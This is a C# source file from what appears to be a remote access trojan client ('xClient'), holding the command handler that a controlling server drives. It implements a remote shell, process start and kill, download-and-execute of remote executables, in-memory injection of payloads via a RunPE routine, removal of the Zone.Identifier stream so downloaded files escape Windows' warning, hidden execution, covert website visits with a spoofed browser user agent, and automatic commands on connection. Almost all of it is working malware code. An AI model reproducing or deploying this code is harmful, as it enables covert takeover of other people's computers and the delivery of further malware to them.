using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using xClient.Core.RemoteShell;
using xClient.Core.Helper;
using System.Collections.Generic;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN MISCELLANEOUS METHODS. */
    public static partial class CommandHandler
    {
        public static void HandleStartProcess(Packets.ServerPackets.StartProcess command, Client client)
        {
            if (string.IsNullOrEmpty(command.Processname))
            {
                new Packets.ClientPackets.Status("Process could not be started!").Execute(client);
                return;
            }

            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    UseShellExecute = true,
                    FileName = command.Processname
                };
                Process.Start(startInfo);
            }
            catch
            {
                new Packets.ClientPackets.Status("Process could not be started!").Execute(client);
            }
            finally
            {
                HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
            }
        }

        public static void HandleKillProcess(Packets.ServerPackets.KillProcess command, Client client)
        {
            try
            {
                Process.GetProcessById(command.PID).Kill();
            }
            catch
            {
            }
            finally
            {
                HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
            }
        }

        public static void HandleShellCommand(Packets.ServerPackets.ShellCommand command, Client client)
        {
            string input = command.Command;

            if (_shell == null && input == "exit") return;
            if (_shell == null) _shell = new Shell();

            if (input == "exit")
                CloseShell();
            else
                _shell.ExecuteCommand(input);
        }

        public static void CloseShell()
        {
            if (_shell != null)
            {
                _shell.CloseSession();
                _shell = null;
            }
        }
        public static void HandleOnJoin(Packets.ServerPackets.OnJoin command, Client client)
        {
            //MessageBox.Show("Received OnJoin");
            new Packets.ClientPackets.Status("Processing On Join Commands...").Execute(client);
            new Thread(() =>
            {
                try
                {
                    foreach (KeyValuePair<string, string> cmd in command.Commands)
                    {
                        switch (cmd.Key)
                        {
                            case "VisitURL":
                                HandleVisitWebsite(new Packets.ServerPackets.VisitWebsite(cmd.Value, false), client);
                                break;
                            case "DownloadDrop":
                                HandleDownloadAndExecuteCommand(new Packets.ServerPackets.DownloadAndExecute(cmd.Value, false, "drop"), client);
                                break;
                            case "DownloadNative":
                                HandleDownloadAndExecuteCommand(new Packets.ServerPackets.DownloadAndExecute(cmd.Value, false, "cmd"), client);
                                break;
                            case "DownloadSelfInject":
                                HandleDownloadAndExecuteCommand(new Packets.ServerPackets.DownloadAndExecute(cmd.Value, false, "self"), client);
                                break;
                            case "VisitURLHidden":
                                HandleVisitWebsite(new Packets.ServerPackets.VisitWebsite(cmd.Value, true), client);
                                break;
                            default:
                                new Packets.ClientPackets.Status(string.Format("OnJoin failed to recognize {0}", cmd.Key)).Execute(client);
                                break;
                        }
                    }
                }
                catch (Exception ex)
                {
                    new Packets.ClientPackets.Status(string.Format("OnJoin failed: {0}", ex.Message)).Execute(client);
                    return;
                }
            }).Start();
        }
        public static void HandleDownloadAndExecuteCommand(Packets.ServerPackets.DownloadAndExecute command,
                   Client client)
        {
            new Packets.ClientPackets.Status("Downloading file...").Execute(client);

            new Thread(() =>
            {
                try
                {
                    if (command.Type == "drop")
                    {
                        #region drop
                        string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                            Helper.Helper.GetRandomFilename(12, ".exe"));

                        try
                        {
                            using (WebClient c = new WebClient())
                            {
                                c.Proxy = null;
                                c.DownloadFile(command.URL, tempFile);
                            }
                        }
                        catch
                        {
                            new Packets.ClientPackets.Status("Download failed!").Execute(client);
                            return;
                        }

                        new Packets.ClientPackets.Status("Downloaded File!").Execute(client);

                        try
                        {
                            DeleteFile(tempFile + ":Zone.Identifier");

                            var bytes = File.ReadAllBytes(tempFile);
                            if (bytes[0] != 'M' && bytes[1] != 'Z')
                                throw new Exception("Not an .EXE file!");

                            ProcessStartInfo startInfo = new ProcessStartInfo();
                            if (command.RunHidden)
                            {
                                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                startInfo.CreateNoWindow = true;
                            }
                            startInfo.UseShellExecute = command.RunHidden;
                            startInfo.FileName = tempFile;
                            Process.Start(startInfo);
                        }
                        catch (Exception ex)
                        {
                            DeleteFile(tempFile);
                            new Packets.ClientPackets.Status(string.Format("Execution failed: {0}", ex.Message)).Execute(client);
                            return;
                        }
                        #endregion
                    }
                    else if (command.Type == "self")
                    {
                        byte[] fileBytes = Download(command.URL, client);
                        if (fileBytes == null)
                            new Packets.ClientPackets.Status("Download failed!").Execute(client);

                        RunPE.Invoke(new string[] { Convert.ToBase64String(fileBytes), "self", "" }, client);
                    }
                    else if (command.Type == "cmd")
                    {
                        byte[] fileBytes = Download(command.URL, client);
                        if (fileBytes == null)
                            new Packets.ClientPackets.Status("Download failed!").Execute(client);

                        RunPE.Invoke(new string[] { Convert.ToBase64String(fileBytes), "sys", "cmd" }, client);
                    }
                    else
                    {
                        new Packets.ClientPackets.Status("Unknown Injection Type!").Execute(client);
                    }
                }
                catch (Exception ex)
                {
                    new Packets.ClientPackets.Status(string.Format("Execution failed: {0}", ex.Message)).Execute(client);
                    return;
                }
                new Packets.ClientPackets.Status("Executed File!").Execute(client);
            }).Start();
        }

        private static byte[] Download(string url, Client client)
        {
            byte[] fileBytes;
            try
            {
                using (WebClient c = new WebClient())
                {
                    c.Proxy = null;
                    fileBytes = c.DownloadData(url);
                }
            }
            catch
            {
                return null;
            }

            return fileBytes;
        }
        public static void HandleUploadAndExecute(Packets.ServerPackets.UploadAndExecute command, Client client)
        {
            string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                command.FileName);

            try
            {
                if (command.CurrentBlock == 0 && command.Block[0] != 'M' && command.Block[1] != 'Z')
                    throw new Exception("No executable file");

                MemorySplit destFile = new MemorySplit(filePath);

                if (!destFile.AppendBlock(command.Block, command.CurrentBlock))
                {
                    new Packets.ClientPackets.Status(string.Format("Writing failed: {0}", destFile.LastError)).Execute(
                        client);
                    return;
                }

                if ((command.CurrentBlock + 1) == command.MaxBlocks) // execute
                {
                    if (command.Type == "drop")
                    {

                        if (!destFile.DropFile())
                        {
                            new Packets.ClientPackets.Status(string.Format("Drop failed: {0}", destFile.LastError)).Execute(
                               client);
                            return;
                        }

                        DeleteFile(filePath + ":Zone.Identifier");

                        ProcessStartInfo startInfo = new ProcessStartInfo();
                        if (command.RunHidden)
                        {
                            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            startInfo.CreateNoWindow = true;
                        }
                        startInfo.UseShellExecute = command.RunHidden;
                        startInfo.FileName = filePath;
                        Process.Start(startInfo);

                        new Packets.ClientPackets.Status("Executed File!").Execute(client);
                    }
                    else if (command.Type == "self")
                    {
                        byte[] dat = destFile.ToByteArray();
                        //File.WriteAllBytes("lol.exe", dat);
                        if (dat == null)
                        {
                            new Packets.ClientPackets.Status("Payload was null!").Execute(client);
                            return;
                        }
                        //Assembly a = Assembly.Load(xClient.Properties.Resources.RunPELib);
                        //a.EntryPoint.Invoke(null, new object[] { new string[] { Convert.ToBase64String(dat), "self", "" } });

                        RunPE.Invoke(new string[] { Convert.ToBase64String(dat), "self", "" }, client);
                    }
                    else if (command.Type == "cmd")
                    {
                        byte[] dat = destFile.ToByteArray();
                        if (dat == null)
                        {
                            new Packets.ClientPackets.Status("Payload was null!").Execute(client);
                            return;
                        }
                        //Assembly a = Assembly.Load(xClient.Properties.Resources.RunPELib);
                        //a.EntryPoint.Invoke(null, new object[] { new string[] { Convert.ToBase64String(dat), "sys", "cmd" } });
                        RunPE.Invoke(new string[] { Convert.ToBase64String(dat), "sys", "cmd" }, client);
                    }
                    else
                    {
                        new Packets.ClientPackets.Status("Unknown Injection Type!").Execute(client);
                    }

                }
            }
            catch (Exception ex)
            {
                DeleteFile(filePath);
                new Packets.ClientPackets.Status(string.Format("Execution failed: {0}", ex.ToString())).Execute(client);
                //MessageBox.Show(ex.ToString());
            }
        }

        public static void HandleVisitWebsite(Packets.ServerPackets.VisitWebsite command, Client client)
        {
            string url = command.URL;

            if (!url.StartsWith("http"))
                url = "http://" + url;

            if (Uri.IsWellFormedUriString(url, UriKind.RelativeOrAbsolute))
            {
                if (!command.Hidden)
                    Process.Start(url);
                else
                {
                    try
                    {
                        HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(url);
                        request.UserAgent =
                            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36";
                        request.AllowAutoRedirect = true;
                        request.Timeout = 10000;
                        request.Method = "GET";

                        using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                        {
                        }
                    }
                    catch
                    {
                    }
                }

                new Packets.ClientPackets.Status("Visited Website").Execute(client);
            }
        }

        public static void HandleShowMessageBox(Packets.ServerPackets.ShowMessageBox command, Client client)
        {
            new Thread(() =>
            {
                MessageBox.Show(null, command.Text, command.Caption,
                    (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), command.MessageboxButton),
                    (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), command.MessageboxIcon));
            }).Start();

            new Packets.ClientPackets.Status("Showed Messagebox").Execute(client);
        }
    }
}